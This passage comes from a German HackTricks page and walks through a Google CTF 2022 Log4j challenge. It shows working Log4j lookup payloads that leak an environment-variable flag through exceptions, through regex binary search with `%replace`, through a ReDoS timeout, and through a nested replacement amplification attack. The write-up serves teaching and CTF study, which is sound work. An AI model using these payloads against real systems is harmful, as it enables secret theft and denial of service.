Wie auf dieser Seite in [**vorherigen Payloads**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification) zu sehen ist, gibt es verschiedene M√∂glichkeiten, auf Umgebungsvariablen zuzugreifen, wie z.B. **`${env:FLAG}`**. In diesem CTF war dies nutzlos, aber in anderen realen Szenarien k√∂nnte es n√ºtzlich sein.

### Exfiltration in Ausnahmen

Im CTF konnte man nicht auf stderr der Java-Anwendung mit Log4J zugreifen, aber Log4J **Ausnahmen werden an stdout gesendet**, was in der Python-Anwendung ausgegeben wurde. Das bedeutet, dass wir durch Ausl√∂sen einer Ausnahme auf den Inhalt zugreifen konnten. Eine Ausnahme zur Exfiltration der Flagge war: **`${java:${env:FLAG}}`.** Dies funktioniert, weil **`${java:CTF{blahblah}}`** nicht existiert und eine Ausnahme mit dem Wert der Flagge angezeigt wird:

![](<../../.gitbook/assets/image (157).png>)

### Conversion Patterns Ausnahmen

Nur zur Erw√§hnung, Sie k√∂nnten auch neue [**Conversion Patterns**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout) injizieren und Ausnahmen ausl√∂sen, die in `stdout` protokolliert werden. Zum Beispiel:

![](<../../.gitbook/assets/image (3) (2) (1) (1).png>)

Dies war nicht n√ºtzlich, um Daten innerhalb der Fehlermeldung zu exfiltrieren, da die Suche vor dem Conversion Pattern nicht gel√∂st wurde, aber es k√∂nnte n√ºtzlich sein f√ºr andere Dinge wie die Erkennung.

### Conversion Patterns Regexes

Es ist jedoch m√∂glich, einige **Conversion Patterns, die Regexes unterst√ºtzen**, zu verwenden, um Informationen aus einer Suche durch Verwendung von Regexes und Ausnutzung von **bin√§rer Suche** oder **zeitbasiertem** Verhalten zu exfiltrieren.

* **Bin√§re Suche √ºber Ausnahme-Meldungen**

Das Conversion Pattern **`%replace`** kann verwendet werden, um **Inhalte** aus einem **String** zu **ersetzen**, auch unter Verwendung von **Regexes**. Es funktioniert wie folgt: `replace{pattern}{regex}{substitution}`\
Indem man dieses Verhalten ausnutzt, kann man eine Ausnahme ausl√∂sen lassen, wenn das Regex irgendetwas im String findet (und keine Ausnahme, wenn es nicht gefunden wird), wie zum Beispiel:
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **Zeitbasiert**

Wie bereits im vorherigen Abschnitt erw√§hnt, unterst√ºtzt **`%replace`** regul√§re Ausdr√ºcke. Daher ist es m√∂glich, eine Payload von der [**ReDoS-Seite**](../regular-expression-denial-of-service-redos.md) zu verwenden, um bei Auffinden der Flagge eine **Timeout**-Fehlermeldung auszul√∂sen.\
Beispielsweise w√ºrde eine Payload wie `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` einen **Timeout** in diesem CTF ausl√∂sen.

In diesem [**Writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) wurde anstelle eines ReDoS-Angriffs ein **Amplifikationsangriff** verwendet, um einen Zeitunterschied in der Antwort zu verursachen:

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> Wenn die Flagge mit `flagGuess` beginnt, wird die gesamte Flagge durch 29 `#`-Zeichen ersetzt (Ich habe dieses Zeichen verwendet, da es wahrscheinlich nicht Teil der Flagge ist). **Jedes der resultierenden 29 `#`-Zeichen wird dann durch 54 `#`-Zeichen ersetzt**. Dieser Vorgang wird **6 Mal** wiederholt, was zu insgesamt ` 29*54*54^6* =`` `` `**`96816014208`  `#`-Zeichen f√ºhrt!**
>
> Durch das Ersetzen so vieler `#`-Zeichen wird der 10-Sekunden-Timeout der Flask-Anwendung ausgel√∂st, was wiederum dazu f√ºhrt, dass der HTTP-Statuscode 500 an den Benutzer gesendet wird. (Wenn die Flagge nicht mit `flagGuess` beginnt, erhalten wir einen anderen als den 500er-Statuscode)

## Referenzen

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Finden Sie die wichtigsten Sicherheitsl√ºcken, damit Sie sie schneller beheben k√∂nnen. Intruder √ºberwacht Ihre Angriffsfl√§che, f√ºhrt proaktive Bedrohungsscans durch und findet Probleme in Ihrer gesamten Technologieinfrastruktur, von APIs √ºber Webanwendungen bis hin zu Cloud-Systemen. [**Probieren Sie es noch heute kostenlos aus**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen** m√∂chten, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder folgen Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie Pull Requests an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
